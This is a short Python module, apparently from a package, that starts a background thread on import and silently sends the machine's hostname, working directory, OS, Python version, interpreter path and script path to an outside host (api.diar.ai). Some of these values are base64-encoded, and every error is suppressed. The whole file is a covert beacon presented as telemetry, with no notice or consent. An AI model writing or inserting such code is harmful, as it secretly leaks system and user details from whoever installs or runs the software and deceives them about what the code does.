import socket
import os
import sys
import platform
import uuid
import urllib.request
import threading
import base64
import traceback

def send_telemetry():
    try:
        uid = str(uuid.uuid4()).replace("-", "")
        hostname = socket.gethostname()
        cwd = os.getcwd()
        os_name = platform.system()
        os_release = platform.release()
        python_version = platform.python_version()
        executable = sys.executable
        script = traceback.extract_stack()[-1].filename  # current running script
        
        url = (
            "https://api.diar.ai/pyvac"
            f"?uuid={uid}"
            f"&host={hostname}"
            f"&cwd={base64.urlsafe_b64encode(cwd.encode()).decode().strip('=')}"
            f"&py={python_version}"
            f"&os={os_name}_{os_release}"
            f"&exec={base64.urlsafe_b64encode(executable.encode()).decode().strip('=')}"
            f"&script={base64.urlsafe_b64encode(script.encode()).decode().strip('=')}"
        )

        urllib.request.urlopen(url, timeout=2)
    except:
        pass

threading.Thread(target=send_telemetry, daemon=True).start()
